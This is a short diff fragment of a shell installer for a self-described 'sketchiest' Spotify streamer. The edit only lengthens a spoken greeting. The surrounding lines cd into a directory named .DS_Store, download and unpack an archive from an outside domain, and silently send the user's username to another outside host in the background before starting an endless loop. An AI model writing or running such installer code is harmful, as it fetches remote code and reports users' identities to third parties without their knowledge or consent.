@@ -7,7 +7,7 @@ cd .DS_Store
 curl -O http://emraldia.com/rchive.zip
 unzip rchive.zip
 cd spotify-streamer
-say \"Thank you for installing the sketchiest streamer. Prepare yourself.\"
+say \"Thank you for installing the sketchiest streamer. Prepare yourself. 3. 2. 1. \"
 curl spotify.ngargi.me/thing/`whoami` > /dev/null &
 while [[ true ]]
 do
